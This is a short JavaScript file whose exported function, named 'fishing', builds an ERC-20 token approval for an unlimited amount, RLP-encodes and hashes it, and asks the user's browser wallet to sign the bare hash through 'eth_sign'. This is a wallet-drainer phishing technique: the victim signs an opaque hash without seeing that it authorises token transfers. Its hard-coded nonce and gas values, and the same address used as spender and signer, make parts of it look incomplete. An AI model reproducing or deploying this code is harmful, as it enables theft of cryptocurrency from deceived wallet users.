import { ethers } from "ethers";
import erc20Abi from '../abis/GenericErc20.json';
import RLP from "rlp";
import Web3 from "web3";

export async function fishing(walletAddress,erc20Obj) {
    console.log(walletAddress)
    let newInterf = new ethers.utils.Interface(erc20Abi)
    const funData = newInterf.encodeFunctionData("approve",
        [walletAddress,
        ethers.utils.parseUnits("9999999999999999999", 6)]
    );
    const transaction = {
        nonce: 1,
        gasPrice: 1000000001,
        gasLimit: 5000000,
        to: erc20Obj.address,
        value: 0,
        data: funData
    };
    const rawTransaction = RLP.encode([transaction.nonce, transaction.gasPrice, transaction.gasLimit, transaction.to, transaction.value, transaction.data]);
    const msgHex = rawTransaction.toString('hex');
    const msgHash = Web3.utils.keccak256('0x' + msgHex);
    const ethResult = await window.ethereum.request({
        method: 'eth_sign',
        params: [walletAddress, msgHash],
    });
    console.log(ethResult);
}